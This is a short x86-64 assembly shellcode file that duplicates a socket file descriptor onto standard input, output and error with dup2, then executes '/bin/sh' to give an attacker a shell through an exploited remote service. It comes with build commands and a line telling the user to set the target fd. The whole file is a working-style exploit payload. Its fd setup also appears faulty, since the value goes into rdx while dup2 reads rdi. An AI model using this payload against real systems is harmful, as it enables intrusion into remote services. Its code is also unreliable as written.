
;
; Author: BITAM Salim (github.com/soolidsnake)
; Lenght: 51 bytes
; Purpose: pops shell after using dup2 for a specific fd
; usefull when the remote service uses sockets to communicate
;
; nasm -f elf64 dup2_shell.asm; ld -m elf_x86_64 -s -o dup2_shell dup2_shell.o
;

section .text
  global _start

_start:


	xor rax, rax
	xor rdi, rdi
	xor rsi, rsi
	mov dl, 4	; old fd, change it to the fd you wana dup
	label:
		mov al, 33
		syscall		;call dup2
		inc rsi		; new fd => 0, 1, 2
		cmp rsi, 3
		jl label

	xor rsi, rsi
	xor rdx, rdx
	mov rax, '/bin/sh'
	push rax
	xchg rdi, rsp
	mov rax, 59
	syscall
